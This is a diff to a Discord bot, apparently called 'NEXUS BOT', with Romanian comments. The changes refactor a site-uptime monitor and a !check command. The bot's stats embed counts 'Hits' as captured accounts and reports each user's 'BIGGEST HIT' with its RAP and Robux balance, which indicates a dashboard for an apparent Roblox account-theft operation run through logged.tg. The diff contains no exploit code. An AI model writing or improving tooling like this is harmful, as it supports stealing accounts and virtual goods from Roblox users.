@@ -37,7 +37,7 @@ const STATUS_CHANNEL_ID = "1437904935059722381";
 const MAIN_SITE_URL = "https://www.logged.tg/auth/nexus";
 const MAIN_SITE_NAME = "NEXUS";
 
-// 5.1️⃣ Monitor site la fiecare 30 secunde
+// 5.1️⃣ Monitor site la fiecare 30 secunde (anunță automat doar când se schimbă status)
 setInterval(async () => {
   try {
     const start = Date.now();
@@ -55,18 +55,14 @@ setInterval(async () => {
     if (res.ok && !lastUpTime) lastUpTime = Date.now();
     if (!res.ok) lastUpTime = null;
 
+    // Trimite mesaj doar dacă status-ul s-a schimbat
     if (currentStatus !== lastStatus) {
       const channel = client.channels.cache.get(STATUS_CHANNEL_ID);
       if (channel) {
         const embed = new EmbedBuilder()
-          .setColor(0x000000) // border negru
-          .setThumbnail("") // gol
-          .setDescription(
-            `-- **NEXUS BOT** --\n\n` +
-            `**${MAIN_SITE_NAME}**\n` +
-            `STATUS: ${currentStatus}\n` +
-            `Response Time: ${ping ? ping + "ms" : "N/A"}`
-          )
+          .setColor(0x000000)
+          .setThumbnail("")
+          .setDescription(`-- **NEXUS BOT** --\n\n**${MAIN_SITE_NAME}**\nSTATUS: ${currentStatus}\nResponse Time: ${ping ? ping + "ms" : "N/A"}`)
           .setImage("https://i.imgur.com/qxSArud.gif")
           .setFooter({ text: "Site Uptime Monitor" });
 
@@ -106,7 +102,7 @@ client.on('messageCreate', async (message) => {
       const userName = profile.userName || targetUser.username;
 
       const embed = new EmbedBuilder()
-        .setColor(0x000000) // negru
+        .setColor(0x000000)
         .setThumbnail(targetUser.displayAvatarURL({ dynamic: true, size: 128 }))
         .setDescription(`-- **NEXUS BOT** --\n\n**User:** ${userName}\n\n**TOTAL STATS:**\nHits: ${formatNumber(normal.Totals?.Accounts)}\nVisits: ${formatNumber(normal.Totals?.Visits)}\nClicks: ${formatNumber(normal.Totals?.Clicks)}\n\n**BIGGEST HIT:**\nSummary: ${formatNumber(normal.Highest?.Summary)}\nRAP: ${formatNumber(normal.Highest?.Rap)}\nRobux: ${formatNumber(normal.Highest?.Balance)}\n\n**TOTAL HIT STATS:**\nSummary: ${formatNumber(normal.Totals?.Summary)}\nRAP: ${formatNumber(normal.Totals?.Rap)}\nRobux: ${formatNumber(normal.Totals?.Balance)}`)
         .setImage("https://i.imgur.com/qxSArud.gif")
@@ -144,7 +140,7 @@ client.on('messageCreate', async (message) => {
     }
   }
 
-  // ===== !check =====
+  // ===== !check ===== (user initiated only)
   if (message.content.startsWith('!check')) {
     try {
       const start = Date.now();
@@ -162,8 +158,7 @@ client.on('messageCreate', async (message) => {
         .setImage("https://i.imgur.com/qxSArud.gif")
         .setFooter({ text: "NEXUS Site Monitor" });
 
-      const channel = client.channels.cache.get(STATUS_CHANNEL_ID);
-      if(channel) await channel.send({ embeds: [embed] });
+      await message.channel.send({ embeds: [embed] });
 
     } catch (err) {
       console.error(err);
